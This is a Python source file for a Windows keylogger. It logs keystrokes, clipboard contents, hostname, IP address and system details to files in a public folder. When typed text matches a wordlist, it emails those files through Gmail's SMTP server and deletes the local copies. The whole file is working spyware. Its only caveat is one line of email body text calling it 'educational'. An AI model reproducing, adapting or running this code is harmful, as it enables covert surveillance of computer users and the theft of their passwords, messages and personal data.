# libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
from datetime import datetime
import os
import threading
from threading import Thread, Event

# define file paths and names
system_information = "system.txt"
clipboard_information = "clipboard.txt"
keys_information = "key_log.txt"
extend = "\\"
file_path =  "C:\\Users\\Public"

# time controls
email_interval = 1800  # 30 minutes
delete_wait_time = 90  # 1 minute 30 sec

# Subject and body
subject = ""
body = "A match is found.\nThis is an automated email generated using a keylogger, this is only for educational purposes.\n PFA"

# Email ID
email_address = "" # Enter Email id
password = "" # Enter Password

# Send email
def send_email(attachments=[]):
    # Create message container
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = subject

    # Attach body
    msg.attach(MIMEText(body, 'plain'))

    # Attach files
    for attachment in attachments:
        # Open the file to be sent
        with open(attachment, "rb") as file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(file.read())

        # Encode file in ASCII characters to send by email
        encoders.encode_base64(part)

        # Add header as key/value pair to attachment part
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {attachment}",
        )

        # Attach the file to the message
        msg.attach(part)

    # Send email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(email_address, password)
        server.sendmail(email_address, email_address, msg.as_string())

def computer_information():
    with open(file_path + extend+ system_information, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)

            f.write("Processor: " + (platform.processor() + "\n"))
            f.write("System: " + platform.system() + " " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("IP Address: " + IPAddr + "\n")

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied.")

def delete_files(file_list):
    for file in file_list:
        try:
            os.remove(file)
        except FileNotFoundError:
            pass

currentTime = time.time()
stoppingTime = currentTime + email_interval

def on_press(key):
    global keys, count, currentTime

    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False

def wait_and_reset_timer():
    copy_clipboard()
    computer_information()

    global timer
    timer = threading.Timer(email_interval, wait_and_reset_timer)
    timer.start()
    # Wait for a minute before deleting files
    time.sleep(delete_wait_time)

    # Send keylogger contents to email if match found
    attachments = [file_path + extend + system_information, file_path + extend + keys_information, file_path + extend + clipboard_information]
    
    txt_file = (file_path + extend + keys_information)  # Text file containing the text
    patterns_file = 'wordlist.txt'  # Text file containing the patterns

    txt = read_file(txt_file)
    patterns = read_file(patterns_file).split('\n')

    for pat in patterns:
        if KMPSearch(pat, txt):
            # Subject and body
            now = datetime.now()
            dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            device_name = socket.gethostname()
            subject = f"Report for {device_name} ({socket.gethostbyname(device_name)}) at {dt_string}"

            send_email(attachments)
            # Clear contents of keylogger log file.
            with open(file_path + extend + keys_information, "w") as f:
                f.write(" ")

            delete_files(attachments)  # Add other files if needed

def computeLPSArray(pat, M, lps):
    length = 0  # length of the previous longest prefix suffix
    lps[0] = 0  # lps[0] is always 0
    i = 1

    # the loop calculates lps[i] for i = 1 to M-1
    while i < M:
        if pat[i] == pat[length]:
            length += 1
            lps[i] = length
            i += 1
        else:
            if length != 0:
                length = lps[length - 1]
            else:
                lps[i] = 0
                i += 1

def KMPSearch(pat, txt):
    M = len(pat)
    N = len(txt)

    # create lps[] that will hold the longest prefix suffix
    # values for pattern
    lps = [0] * M

    # Preprocess the pattern (calculate lps[] array)
    computeLPSArray(pat, M, lps)

    i = 0  # index for txt[]
    while i < N:
        j = 0  # index for pat[]
        while j < M and i + j < N and pat[j] == txt[i + j]:
            j += 1
        if j == M:  # if pat[0...M-1] = txt[i, i+1, ...i+M-1]
            return True
            i += M - 1
        else:
            i += max(1, j - lps[j - 1])
    return False  # Return False if pattern not found

def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.read().strip()

# Start the timer
timer = threading.Timer(email_interval, wait_and_reset_timer)
timer.start()

while True:
    # Subject
    now=datetime.now()
    dt_string=now.strftime("%d/%m/%Y %H:%M:%S")
    device_name=socket.gethostname()
    subject = f"Report for {device_name} ({socket.gethostbyname(device_name)}) at {dt_string}"

    count = 0
    keys = []
    currentTime = time.time()
    stoppingTime = currentTime + email_interval
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
